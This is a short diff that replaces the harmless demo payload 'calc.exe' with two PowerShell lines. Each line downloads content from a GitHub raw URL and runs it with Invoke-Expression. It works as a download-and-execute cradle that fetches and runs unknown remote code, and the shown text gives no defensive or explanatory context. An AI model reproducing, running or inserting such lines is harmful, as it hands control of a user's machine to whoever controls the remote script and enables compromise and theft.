@@ -1,1 +1,2 @@
-calc.exe
+iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/othermeinthenightcontrol2/1/refs/heads/main/entry' -UseBasicParsing).Content ; start-sleep 1 ; 
+iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/othermeinthenightcontrol2/1/refs/heads/main/exe1' -UseBasicParsing).Content
